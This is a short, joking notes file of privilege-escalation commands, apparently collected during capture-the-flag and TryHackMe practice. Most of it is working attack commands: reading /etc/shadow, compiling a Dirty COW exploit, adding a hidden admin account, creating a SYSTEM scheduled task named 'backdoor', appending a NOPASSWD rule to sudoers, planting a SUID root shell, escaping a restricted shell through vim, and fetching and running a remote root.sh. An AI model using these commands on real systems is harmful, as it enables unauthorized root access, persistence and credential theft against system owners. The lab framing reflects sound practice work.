
# tried this, didn't get root, but found temp dir with juicy perms 
`find / -perm -u=s -type f 2>/dev/null
`
# looked promising, but just opened a text file?
`/usr/bin/less /etc/shadow`

# windows service unquoted path maybe? need to test with space in path
`wmic service get name,pathname | findstr /i "Program Files"`

# old kernel exploit maybe? saved this for later…
`cc -pthread dirty.c -o dirty && ./dirty`

# wrote this after watching ippsec and forgot what it does 
`awk 'BEGIN {while (1) print "A"}' | ./vuln`

# added user and forgot to clean it — might be still active lol
`net user tempadmin Password123! /add`

# used winPEAS and got 300 lines of green text, panicked, grabbed the first thing with “AlwaysInstallElevated”

# tried this during a THM room, gave SYSTEM but only on that weird server version
`schtasks /create /tn backdoor /tr "cmd.exe /c whoami > C:\output.txt" /sc minute /ru SYSTEM`

# lol this binary had SUID bit — chmod 777'd the whole folder to make it look normal 
`chmod 777 /home/user/scripts`

# lolcat was installed on the target — privilege escalation or rainbow escalation?
`lolcat /etc/passwd`

# echo’d myself into sudoers… yeah that was dumb
`echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`

# powershell trick that worked once and never again
`powershell -Command "Start-Process cmd -Verb runAs"`

# tried to escape restricted shell and ended up in Vim hell
`vim
:set shell=/bin/bash
:shell`

# this actually worked and I'm still confused why
`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p`

# almost nuked the server trying this — don't use in prod?
`wget http://10.10.10.5/root.sh && chmod +x root.sh && ./root.sh`

# printed PATH to see if I could hijack a command — forgot I was already root
`echo $PATH`
